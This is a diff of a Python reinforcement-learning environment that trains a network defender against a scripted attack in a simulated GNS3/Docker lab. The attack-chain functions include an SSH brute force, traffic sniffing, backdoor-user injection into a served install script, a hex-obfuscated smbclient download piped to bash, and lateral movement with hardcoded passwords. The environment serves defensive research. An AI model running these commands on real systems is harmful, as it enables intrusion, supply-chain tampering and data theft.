@@ -1,10 +1,11 @@
-from network_interactions import *  # Import your functions
+from network_interactions import *
 import gymnasium as gym
 from gymnasium import spaces
 import numpy as np
 from constants import *
 import re
 import xml.etree.ElementTree as ET
+import json
 
 class NetworkDefenseEnv(gym.Env):
     def __init__(self):
@@ -12,6 +13,12 @@ class NetworkDefenseEnv(gym.Env):
 
         self.docker_ids = {}
         self.gns3_ids = {}
+        self.current_rtype = ""
+        self.current_action = ""
+        self.log_file = "training_v2.json"
+        self.info_stolen = False
+        self.step_counter = 0
+
 
         self.attack_chain = [
             scan_range,
@@ -26,150 +33,195 @@ class NetworkDefenseEnv(gym.Env):
 
         # 4 categories (detection, mitigation, containment, idle)
         types = 4
-        commands = 3
-        nodes = 4
-        users = 3
-        rules = 3
+        commands = 2
+        nodes = 3
+        src_ips = 5
 
         self.action_space = spaces.MultiDiscrete(
-            [types, commands, nodes, users, rules])
-        
+            [types, commands, nodes, src_ips])
+
+        #"snort_alerts": spaces.Box(low=0, high=np.inf, shape=(5,), dtype=np.int32),
         self.observation_space = spaces.Dict({
-            "snort_alerts": spaces.Box(low=0, high=np.inf, shape=(5,), dtype=np.int32),
-            "firewall_logs": spaces.MultiBinary(5),  
-            "hosts_up": spaces.MultiBinary(4),
-            "hosts_down": spaces.MultiBinary(4)
-        })
+            "snort_alerts": spaces.Box(low=0, high=np.inf, shape=(5, 4), dtype=np.int8),    # 5 latest alerts: <src_ip, dst_ip, alert_msg, priority>
+            "alert_history": spaces.Box(low=0, high=np.inf, shape=(50, 4), dtype=np.int8),  # History of at most 50 alerts
+            "src_ips": spaces.MultiBinary(5),
+            "host_statuses": spaces.MultiBinary(4)
+            })
 
         self.current_observation = {
-            "snort_alerts": np.zeros(5, dtype=np.int32),
-            "firewall_logs": np.zeros(5, dtype=np.int8),
-            "hosts_up": np.zeros(4, dtype=np.int8),
-            "hosts_down": np.zeros(4, dtype=np.int8)       
+            "snort_alerts": np.zeros((5, 4), dtype=np.int8),
+            "alert_history": np.zeros((50, 4), dtype=np.int8),            
+            "host_statuses": np.ones(4, dtype=np.int8),
+            "src_ips": np.zeros(5, dtype=np.int8)
         }
 
-    def step(self, action, atk_reward=0):
+
+
+### STEP FUNCTION ###
+    def step(self, action):
         response_type = action[0]
         specific_action = action[1]
         node = action[2]
-        user = action[3]
-        rule = action[4]
+        ip = action[3]
+
+        # Attacker's turn
+        if self.attack_index < len(self.attack_chain):
+            print(f"Executing attack step {self.attack_index + 1}")
+            if self.attack_index == len(self.attack_chain) - 1:
+                self.info_stolen = self.attack_chain[self.attack_index](self.docker_ids)
+                if not self.info_stolen:
+                    print("Attack step failed at: ", self.attack_index, self.attack_chain[self.attack_index].__name__)
+            else:
+                if self.attack_chain[self.attack_index](self.docker_ids):
+                    self.attack_index += 1
+                else: 
+                    print("Attack step failed at: ", self.attack_index, self.attack_chain[self.attack_index].__name__)
 
         # Detection
         if response_type == 0:
+            self.current_rtype = "Detection"
+
             if specific_action == 0:
                 print("Add snort rule")
-                #self.add_snort_rule(rule)
+                self.current_action = "Added snort rule"
+                self.add_snort_rule()
 
-            elif specific_action == 1:
-                print("Add firewall rule")
-                #self.add_firewall_rule(rule)
+            if specific_action == 1:
+                print("Idle")
+                self.current_action = "Idle"
+                self.idle()
 
         # Mitigation
         elif response_type == 1:
+            self.current_rtype = "Mitigation"
             if specific_action == 0:
-                print("Limit traffic")
-                #self.limit_traffic(node)
+                print("Blacklisting IP")
+                if self.current_observation["src_ips"][ip] and 0 <= ip < len(constants.REVERSE_IP_ADDRESS_LIST):
+                    print("Valid IP Seen in alerts!")
+                    target_ip = constants.REVERSE_IP_ADDRESS_LIST[ip]
+                    self.current_action = f"Blacklisted IP - {target_ip}"
+
+                    self.blacklist_ip(target_ip)
+                else:
+                    self.current_action = "Blacklisted IP - Invalid"
+                    print("Invalid IP!")
 
             elif specific_action == 1:
-                print("Blacklisting IP")
-                self.blacklist_ip(node)
-
-            elif specific_action == 2:
-                print("Limiting user")
-                #self.limit_user(node, user)
+                print(f"Limiting user on {constants.DEFENSE_NODES[node]}")
+                self.current_action = "Limited user privileges"
+                self.limit_user(node)
 
         # Containment
         elif response_type == 2:
+            self.current_rtype = "Containment"
             if specific_action == 0:
                 print(f"Turning off {constants.DEFENSE_NODES[node]}")
+                self.current_action = f"Turned off {constants.DEFENSE_NODES[node]}"
                 self.turn_off_node(node)
 
             elif specific_action == 1:
                 print(f"Isolating {constants.DEFENSE_NODES[node]}")
+                self.current_action = f"Isolated {constants.DEFENSE_NODES[node]}"
                 self.isolate_node(node)
+
+            # elif specific_action == 2:
+            #     self.current_action = f"Restarted {constants.DEFENSE_NODES[node]}"
+            #     print(f"Restarting {constants.DEFENSE_NODES[node]}")
+            #     self.restart_node(node)
         
-        elif response_type == 3:
-            self.idle()
-        
-        info_stolen = False
-        # Attacker's turn
-        if self.attack_index < len(self.attack_chain):
-            # Execute the next step in the attack chain
-            print(f"Executing attack step {self.attack_index + 1}")
-            if self.attack_index == len(self.attack_chain) - 1:
-                info_stolen = self.attack_chain[self.attack_index](self.docker_ids)
-            else: 
-                self.attack_chain[self.attack_index](self.docker_ids)
-            self.attack_index += 1
+        # Evaluating state
+        print("Evaluating state..")
 
         node_statuses = self.retrieve_node_status()
-
-        print("Evaluating state..")
-        self.current_observation["snort_alerts"] = self.retrieve_snort_logs()
-        self.current_observation["firewall_logs"] = self.retrieve_firewall_logs()
-        self.current_observation["hosts_up"] = node_statuses["hosts_up"]
-        self.current_observation["hosts_down"] = node_statuses["hosts_down"]
+        text_logs, np_logs, src_ips = self.retrieve_snort_logs()
         
-        print(self.current_observation)
-        reward = float(20 - 2*np.sum(self.current_observation["hosts_down"]) - 20*info_stolen)
-        terminated = self.attack_index == len(self.attack_chain)
+        self.current_observation["snort_alerts"] = np_logs
+        
+        new_logs = np_logs.shape[0]
+        max_logs = self.current_observation["alert_history"].shape[0]
+        
+        if new_logs < max_logs:
+            # shift old logs up and append the most recent ones
+            self.current_observation["alert_history"][:-new_logs] = self.current_observation["alert_history"][new_logs:]
+        
+        self.current_observation["alert_history"][-new_logs:] = np_logs
+        self.current_observation["host_statuses"] = node_statuses
+        self.current_observation["src_ips"] = src_ips
+
+        self.clear_logs(self.docker_ids)
+
+        reward = float(20 - 2*(4 - np.sum(self.current_observation["host_statuses"])) - 2*self.attack_index - 20*self.info_stolen)
+        print("Reward:", reward)
+        
+        terminated = self.info_stolen or self.attack_index == len(self.attack_chain) or self.step_counter > 10
         truncated = False
+
+        self._log_to_json(
+            step=self.step_counter,
+            observation=text_logs,
+            response_type=self.current_rtype,
+            action_taken=self.current_action,
+            reward=reward
+        )
+
         print("Step done\n", terminated)
+        self.step_counter += 1
+
         return self.current_observation.copy(), reward, terminated, truncated, {}
-    
+
     def reset(self, seed=None, options=None):
         print("Resetting..")
         self.current_observation = {
-            "snort_alerts": np.zeros(5, dtype=np.int32),
-            "firewall_logs": np.zeros(5, dtype=np.int8),
-            "hosts_up": np.zeros(4, dtype=np.int8),
-            "hosts_down": np.zeros(4, dtype=np.int8),
+            "snort_alerts": np.zeros((5, 4), dtype=np.int8),
+            "alert_history": np.zeros((50, 4), dtype=np.int8),            
+            "host_statuses": np.ones(4, dtype=np.int8),
+            "src_ips": np.zeros(5, dtype=np.int8)
         }
 
         self.attack_index = 0
+        self.step_counter = 0
+        self.info_stolen = False
+        self.current_rtype = ""
+        self.current_action = ""
+
         restart_sim()
         self.start_all()
         self.gns3_ids, self.docker_ids = collect_node_ids()
+
+        check_traffic(self.docker_ids)
+
         start_snort(self.docker_ids)
+        start_shorewall(self.docker_ids)
+        start_traffic(self.docker_ids)
 
         return self.current_observation, {}
-    
+
+
+
+### ACTIONS ###
 # Detection
-    # Adds a random snort rule from constants.py and restarts snort to apply rule
-    def add_snort_rule(self, index):
-        rule = constants.SNORT_RULES[index]
-        command = (
-            f'echo "{rule}" >> /var/snort/local.rules'
-        )
+    # Adds a snort rule detecting malicious scripts in http traffic and restarts snort to apply rule
+    def add_snort_rule(self):
+        rule = 'alert tcp 172.17.100.2 80 -> any any (msg:"Malicious Script Detected - Unauthorized User Creation"; flow:to_client,established; content:"useradd"; nocase; content:"chpasswd"; nocase; depth:500; classtype:attempted-admin; priority:1; sid:1000011; rev:1;)'
+        escaped_rule = rule.replace('"','\\"')
+
+        command = f'sh -c \'echo "{escaped_rule}" >> /etc/snort/rules/local.rules\''
         execute_command(self.docker_ids["IDPS"], command)
         restart_snort(self.docker_ids)
 
-    # Adds shorewall rule from constants.py, restarts shorewall to apply
-    def add_firewall_rule(self, index):
-        rule = constants.SHOREWALL_RULES[index]
-        command = (f'echo "{rule}" >> /etc/shorewall/rules'
-                   '&& shorewall restart')
-        execute_command(self.docker_ids["IDPS"], command)
-
 # Mitigation
-
     # Adds target IP to blacklist and restarts firewall to apply updated blacklist
-    def blacklist_ip(self, node_id):
-        target_ip = '10.0.0.2'
+    def blacklist_ip(self, target_ip):
         command = (
             f'echo REJECT net:{target_ip} all all >> /etc/shorewall/rules '
             '&& shorewall reload'
         )
-        execute_command(node_id, command)
+        execute_command(self.docker_ids["IDPS"], command)
 
-    def limit_user(self, node_id, user):
-        command = f'deluser {constants.USERS[user]} sudo'
-        execute_command(node_id, command)
-
-    def limit_traffic(self, node_id):
-        command = 'not implemented'
-        execute_command(node_id, command)
+    def limit_user(self, node_id):
+        name = constants.DEFENSE_NODES[node_id]
+        command = f'deluser james pcap'
+        execute_command(self.docker_ids[name], command)
 
 # Containment
     def turn_off_node(self, node_id):
@@ -188,7 +240,7 @@ class NetworkDefenseEnv(gym.Env):
     def idle(self):
         print("idle, do nothing")
 
-# Other (maybe not usable here)
+# Other
 
     def start_node(self, node_id):
         name = constants.DEFENSE_NODES[node_id]
@@ -204,17 +256,15 @@ class NetworkDefenseEnv(gym.Env):
 
     def start_all(self):
         start_nodes()
-    
+
     def restart(self):
         restart_sim()
 
 # Observation methods
-
     def retrieve_snort_logs(self):
         command = "cat /var/log/snort/alert"
         node = self.docker_ids["IDPS"]
         output_data = execute_command(node, command)
-        print("OUT", output_data)
 
         # Pattern for regular snort log output
         alert_pattern = re.compile(
@@ -223,109 +273,272 @@ class NetworkDefenseEnv(gym.Env):
             r'(?P<src_ip>\d+\.\d+\.\d+\.\d+)(:(?P<src_port>\d+))?\s*->\s*(?P<dst_ip>\d+\.\d+\.\d+\.\d+)(:(?P<dst_port>\d+))?',
             re.MULTILINE
         )
-    
-        priorities = [int(match.group('priority')) for match in alert_pattern.finditer(output_data)]
 
-        max_priority_levels = 5
-        priority_counts = np.zeros(max_priority_levels, dtype=np.int32)
+        matches = [match.groupdict() for match in alert_pattern.finditer(output_data)]
 
-        for priority in priorities:
-            if 1 <= priority <= max_priority_levels:  
-                priority_counts[priority] += 1  # Map priority 1 to index 0, priority 2 to index 1, etc.
+        np_logs = np.zeros((5, 4), dtype=np.int8)
+        text_logs = []
 
-        return priority_counts
+        src_ips = self.current_observation["src_ips"]
+
+        # Store last 5 alerts
+        for i, match in enumerate(matches[-5:]):
+            if match['classification'] not in ('Misc activity','Potentially Bad Traffic'):
+                text_logs.append({
+                    "timestamp": match["timestamp"],
+                    "alert_msg": match['alert_msg'],
+                    "classification": match['classification'],
+                    "src_ip": match['src_ip'],
+                    "dst_ip": match['dst_ip'],
+                    "priority": int(match["priority"])
+                })
+
+                src_ip = constants.IP_ADDRESS_MAP[match['src_ip']]
+                dst_ip = constants.IP_ADDRESS_MAP[match['dst_ip']]
+                alert_msg = constants.ALERT_MAP[match['alert_msg']]
+
+                priority = int(match['priority'])
+                np_logs[i] = [src_ip, dst_ip, alert_msg, priority]
+
+                if 0 <= src_ip < len(src_ips):
+                    src_ips[src_ip] = 1
+
+        return text_logs, np_logs, src_ips
 
     def retrieve_node_status(self):
         URL = ('http://192.168.33.7:3080/v2/projects/'
            f'{constants.PROJECT_ID}/nodes')
-     
+
         response = requests.get( URL, headers={'Content-Type': 'application/x-www-form-urlencoded', })
         if response.status_code == 200:
             data = response.json()
         else:
             print("Failed to fetch data. Status code:", response.status_code)
 
-        nodes_on = 0
-        nodes_off = 0
+        hosts = np.zeros(4, dtype=np.int8)
         for node in data:
-            if node['status'] == 'started':
-                nodes_on += 1
-            else:
-                nodes_off += 1
+            if node['name'] in constants.DEFENSE_NODES_MAP.keys():
+                index = constants.DEFENSE_NODES_MAP[node['name']]
+                hosts[index] = node['status'] == 'started'
 
-        hosts_up = np.array([1 if i < nodes_on else 0 for i in range(4)], dtype=np.int8)
-        hosts_down = np.array([1 if i < nodes_off else 0 for i in range(4)], dtype=np.int8)
+        return hosts
+    
+    def clear_logs(self, dockers):
+        command = '''sh -c 'echo "" > /var/log/snort/alert' '''
+        execute_command(dockers["IDPS"], command)
+        test = 'cat /var/log/snort/alert'
+        res = execute_command(dockers["IDPS"], test)
+    
+    def _log_to_json(self, **kwargs):
+        def convert(obj):
+            if isinstance(obj, np.ndarray):
+                return obj.tolist()  # Convert ndarray to list
+            return obj
 
-        return {
-            "hosts_up": hosts_up,
-            "hosts_down": hosts_down
-        }
+        converted_kwargs = {key: convert(value) for key, value in kwargs.items()}
+
+        try:
+            # Read existing logs if file exists and is valid JSON
+            with open(self.log_file, "r") as f:
+                logs = json.load(f)
+        except (FileNotFoundError, json.JSONDecodeError):
+            logs = []  # Initialize an empty list if file doesn't exist or is invalid
+
+        logs.append(converted_kwargs)  # Append new log entry
+
+        # Overwrite file with updated logs (formatted JSON)
+        with open(self.log_file, "w") as f:
+            json.dump(logs, f, indent=4)  # Pretty-print JSON with indentation
+
+
+
+
+        # def convert(obj):
+        #     if isinstance(obj, np.ndarray):
+        #         return obj.tolist()  # Convert ndarray to list
+        #     return obj
     
-    def retrieve_firewall_logs(self):
-        return np.zeros(5, dtype=np.int8)
-    
+        # # Apply conversion to all values in kwargs
+        # converted_kwargs = {key: convert(value) for key, value in kwargs.items()}
+        
+        # # Write to file
+        # with open(self.log_file, "a") as f:
+        #     f.write(json.dumps(converted_kwargs) + "\n")
+        # # with open(self.log_file, "a") as f:
+        # #     f.write(json.dumps(kwargs) + "\n")
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 def start_snort(docker_ids):
-    command = 'snort -c /etc/snort/snort.conf -i eth0 -i eth1 -i eth2 -A fast -l /var/log/snort -D'
+    command = 'snort -c /etc/snort/snort.conf -i eth2 -i eth1 -i eth0 -A fast -l /var/log/snort -D'
     execute_command(docker_ids["IDPS"], command)
 
 def restart_snort(docker_ids):
-    command = "pgrep snort"
-    pid = execute_command(docker_ids["IDPS"], command)
-    stop_command = f"kill -9 {pid}"
-    execute_command(docker_ids["IDPS"], stop_command)
-    start_snort()
+    command = "pkill -9 snort"
+    execute_command(docker_ids["IDPS"], command)
+    start_snort(docker_ids)
 
+def start_shorewall(docker_ids):
+    command = "shorewall start"
+    execute_command(docker_ids["IDPS"], command)
 
-### Scripted attacks
-# Exploration
+### Scripted attack
+# Reconnaissance
 def scan_range(docker_ids):
-    command = constants.NMAP_SCAN + ' 192.42.0.10'
+    command = constants.NMAP_SCAN + ' 192.42.0.10 2>/dev/null'
     print(f"Port scanning")
     result = execute_command(docker_ids["COZYBEAR"], command)
-    return result
+    return parse_nmap(result)
 
-def traffic_scan(docker_ids):
-    command = "timeout 5 tcpdump -i any -v"
-    result = execute_command(docker_ids["MgmHost"], command)
-    print(result)
-    return result
-
-# Exploitation
+# Brute force
 def brute_force(docker_ids):
     command = f'medusa -h 192.42.0.10 -U /seclists/usr.txt -P /seclists/pass.txt -M ssh | grep FOUND'
     print("Brute Forcing")
     result = execute_command(docker_ids["COZYBEAR"], command)
-    return result
+    return parse_medusa_output(result)
 
+# Traffic sniffing
+def traffic_scan(docker_ids):
+    print("Scanning traffic")
+    command = "timeout 2 tcpdump -i any -v"
+    result = command_repo_server(command, docker_ids)
+    print("RES HERE: ", result)
+    return parse_traffic(result)
+
+# Injecting malicious script
 def inject_script(docker_ids):
+    print("Injecting script")
     payload = "useradd -m -s /bin/bash dylan && echo 'dylan:h4ck3d' | chpasswd"
     command = f'sh -c "echo \\"{payload}\\" >> /var/www/html/reposerver/install.sh"'
-    result = execute_command(docker_ids["RepoServer"], command)
 
+    result = command_elevated_repo_server(command, docker_ids)
+    print(result)
+    return "[SUCCESS]" in result
+
+# Downloading sensitive info
 def get_info(docker_ids):
-    command = r'smbclient //192.168.100.3/Fileshare -U guest%guest -c "prompt off; mget *"'
-    result = execute_command(docker_ids["AdminPC"], command)
+    print("getting info")
+    smb_command = 'smbclient //192.168.100.3/Fileshare -U guest%guest -c "prompt off; mget *"'
+    encoded_cmd = smb_command.encode('utf-8').hex()
+    command = f'echo -n "{encoded_cmd}" | xxd -r -p | bash'
 
+    result = command_admin_pc(command, docker_ids)
+    print(result)
+    return "[SUCCESS]" in result
+
+# Reading sensitive info
 def read_info(docker_ids):
+    print("reading info")
     command = "cat financial_report.txt"
-    result = execute_command(docker_ids["AdminPC"], command)
-    if result == "This is a confidential report":
-        return True
+    result = command_admin_pc(command, docker_ids)
+    print(result)
+    return "This is a confidential report" in result
+
+
+### Attack helper commands
+
+# Attacker logs in to repo server and executes one command
+def command_repo_server(command, docker_ids):
+    ssh_command = f'''sshpass -p james2 \
+    ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 james@192.42.0.10 \
+    'sh -c "{command}"' '''
+
+    return execute_command(docker_ids["COZYBEAR"], ssh_command)
+
+# Attacker logs into repo server on elevated privileges and executes one command
+def command_elevated_repo_server(command, docker_ids):
+    ssh_command = f"""sshpass -p x0sTsQwj4 \
+    ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 user5@192.42.0.10 \
+    '{command} 2>&1 && echo [SUCCESS] || echo [ERROR]'"""
+
+    return execute_command(docker_ids["COZYBEAR"], ssh_command)
+
+# Attacker moves laterally from repo server to admin pc and executes one command
+def command_admin_pc(command, docker_ids):
+    admin_password = "h4ck3d"
+    admin_pc_ip = "192.168.100.2"
+
+    nested_ssh_command = f'''sshpass -p james2 \
+    ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 james@192.42.0.10 \
+    'sshpass -p {admin_password} \
+    ssh -T -o StrictHostKeyChecking=no -o ConnectTimeout=3 dylan@{admin_pc_ip} \
+    "sh -c \\"{command} 2>&1 && echo [SUCCESS] || echo [ERROR]\\""' '''
+
+    return execute_command(docker_ids["COZYBEAR"], nested_ssh_command)
+
+def parse_nmap(data):
+    root = ET.fromstring(data)
+    print("parsing")
+    for host in root.findall("host"):
+        status = host.find("status").get("state")
+        if status == "up":
+            return True
+        
     return False
 
+def parse_medusa_output(data):
+    pattern = r"ACCOUNT FOUND: \[ssh\] Host: (\S+) User: (\S+) Password: (\S+) \[SUCCESS\]"
+    for line in data.splitlines():
+            match = re.search(pattern, line)
+            if match:
+                return True
+    return False
+
+def parse_traffic(data):
+    for line in data.splitlines():
+        if "Authorization: Basic" in line.strip():
+            return True
+    return False
+
+
+### Misc Commands
 def collect_node_ids():
-    URL = 'http://192.168.33.7:3080/v2/projects/31d6b89d-08f6-4eba-8d7d-0ed7a19579b4/nodes'
+    URL = f'http://192.168.33.7:3080/v2/projects/{constants.PROJECT_ID}/nodes'
     response = requests.get(URL, headers={})
-    gns3_dic = {}
-    docker_dic = {}
+    gns3_dict = {}
+    docker_dict = {}
     for node in response.json():
         #print(node['name'], node['node_id'])
-        gns3_dic[node['name']] = node['node_id']
+        gns3_dict[node['name']] = node['node_id']
 
         if 'docker' in node['node_type']:
             name = node['name']
             id = node ['properties']['container_id'][:12]
-            docker_dic[name] = id
-            # print(name)
-            # print(id)
-    return gns3_dic, docker_dic
+            docker_dict[name] = id
+            # print(name, id)
+    return gns3_dict, docker_dict
+
+def check_traffic(docker_ids):
+    command = "timeout 5 ping 192.42.0.10"
+    done = False
+    while not done:
+        res = execute_command(docker_ids["COZYBEAR"], command)
+        #print(res.split("\n"))
+        if res != '' and '64 bytes from 192.42.0.10' in res.split("\n")[-2]:
+            print("Isup")
+            done = True
+        else:
+            print("Not up")
+            done = False
+
+def start_traffic(docker_ids):
+    command = "nohup bash /root/fetch.sh > /dev/null 2>&1 & "
+    execute_command(docker_ids["AdminPC"], command)
